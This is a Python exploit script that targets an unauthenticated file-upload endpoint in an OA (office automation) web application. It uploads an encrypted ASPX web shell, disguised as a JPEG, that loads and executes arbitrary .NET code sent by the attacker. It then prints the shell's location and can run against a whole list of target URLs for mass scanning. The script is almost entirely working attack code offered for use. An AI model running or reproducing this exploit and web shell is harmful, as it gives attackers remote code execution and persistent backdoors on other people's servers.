import argparse
import base64
import json
import subprocess
import requests
import jsonpath
def Args():
    parser = argparse.ArgumentParser(formatter_class=argparse.ArgumentDefaultsHelpFormatter,description='''
某年软件OA upload
    ''')
    parser.add_argument('-u','--url',help="please input URL")
    parser.add_argument('-f','--file',help="please input URL file")
    args = parser.parse_args()
    if args.file is None and args.url is None:
        print(parser.print_help())
        exit()
    else:
        return args
def attack(url):
    realurl = url + "/Controls/Ajax/WebUpload/FileUpload.ashx"
    files = {
        'file':("joker.aspx",'''<%@ Page Language="C#" %><%@Import Namespace="System.Reflection"%><%Session.Add("k","e45e329feb5d925b");byte[] k = Encoding.Default.GetBytes(Session[0] + ""),c = Request.BinaryRead(Request.ContentLength);Assembly.Load(new System.Security.Cryptography.RijndaelManaged().CreateDecryptor(k, k).TransformFinalBlock(c, 0, c.Length)).CreateInstance("U").Equals(this);%>''',
        "image/jpeg")
    }
    headers = {
        "Content-Type": "multipart/form-data",
        "User-Agent": "Mozilla/5.0(Windows NT 10.0;Win64;x64) AppleWebKit/537.36(KHTML, likeGecko) Chrome/92.0.4515.159 Safari/537.36",
        "Accept-Encoding": "gzip, deflate",
        "Accept": '*/*',
        "Connection": "close"
    }
    try:
        res = requests.post(url=realurl,files=files)
        # print(res.text)
        if 'success' in res.text:
            res2 = json.loads(res.text)
            filepath = jsonpath.jsonpath(res2[0],expr='$.FilePath')[0]
            print("upload success！shellpath："+url+filepath)
        else:
            print("vuln is not exists")
    except Exception as e:
             print('vuln is not exists')
def readfile(urlpath):
    list = []
    with open(urlpath,"r") as f:
        line = f.readlines()
    for i in line:
        if '/' == i.strip()[-1:]:
            i = i.strip()
        else:
            i = i.strip()+'/'
        list.append(i)
    return list

def main():
    args = Args()
    if args.file is None and args.url is not None:
        attack(args.url)
    else:
        urllist = readfile(args.file)
        for i in urllist:
            attack(i)
if __name__ =="__main__":
    main()
